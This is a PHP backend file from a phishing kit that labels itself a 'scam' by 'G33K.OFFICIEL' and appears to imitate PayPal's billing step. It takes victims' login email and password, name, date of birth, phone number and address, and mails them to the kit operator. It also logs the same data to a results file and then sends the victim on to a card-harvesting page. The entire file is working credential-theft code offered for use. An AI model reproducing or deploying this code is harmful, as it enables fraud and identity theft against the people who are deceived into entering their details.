<?php 
//PRIV8 SCAM G33K.OFFICIEL V4
session_start();
include("../email.php");
$rand=rand(111611,996999);
$rand2=rand(1116111,9997989);
$md = md5(sha1("This_Scam_Is_Developed_By_G33K.OFFICIEL"));
$aubli = $rand.$md.$rand2;
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? 
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
//================= Date Of Birth Checker ================//
$day = substr($_POST["DOB"],0,2);
$month = substr($_POST["DOB"],3,5);
$year = substr($_POST["DOB"], -4);
if($day > 31 || $month > 12 || $year > 1998){
	header("location:../websc_billing/?enc=".md5(microtime())."&p=1&dispatch=".sha1(microtime())."&error=true");
} elseif($day >= 31 && $month == 02 || $day >= 31 && $month == 04 || $day >= 31 && $month == 06 || $day >= 31 && $month == 08 || $day >= 31 && $month == 10 || $day >= 31 && $month == 12){
	header("location:../websc_billing/?enc=".md5(microtime())."&p=1&dispatch=".sha1(microtime())."&error=true");
//================= Date Of Birth Checker ================//
}  else {
$_SESSION["fname"] = $_POST["firstName"];
$_SESSION["lname"]= $_POST["lastName"];
$_SESSION["DOB"]= $_POST["DOB"];
$_SESSION["PhoneType"]= $_POST["phoneOption"];
$_SESSION["PhoneNumber"]= $_POST["phoneNumber"];
$_SESSION["address1"] = $_POST["address1"];
$_SESSION["city"]= $_POST["city"];
$_SESSION["state"] = $_POST["state"];
$_SESSION["country"] = $_POST["country"];
$_SESSION["ZIP"] = $_POST["zip"];
$xxx = "
=============Login==============
Email: ".$_SESSION["email"]."
Password: ".$_SESSION["pass"]."
=============Login==============
=============Billing============
First Name:".$_SESSION["fname"]."
Last Name:".$_SESSION["lname"]."
DOB:".$_SESSION["DOB"]."
Phone Type (Home/Mobile):".$_SESSION["PhoneType"]."
Phone Number:".$_SESSION["PhoneNumber"]."
Street:".$_SESSION["address1"]."
City:".$_SESSION["city"]."
State:".$_SESSION["state"]."
Country:".$_SESSION["country"]."
Zip:".$_SESSION["ZIP"]."
=============Billing============
IP:$ip
";
$Subject="PPL PRIV8 V4 - BILLING - $ip - ".$_SESSION["country"]."";
$head="From:G33K.OFFICIEL <billing>";
mail($rezult_mail,$Subject,$xxx,$head);
if($txt == 1){$file = fopen("../REZULT/Billings/Billing_By_MonStroNix_From " . $ip . ".txt", 'a');
fwrite($file, $xxx); };
header("location:../websc_card/?enc=".md5(microtime())."&p=1&dispatch=".sha1(microtime()).""); };
?>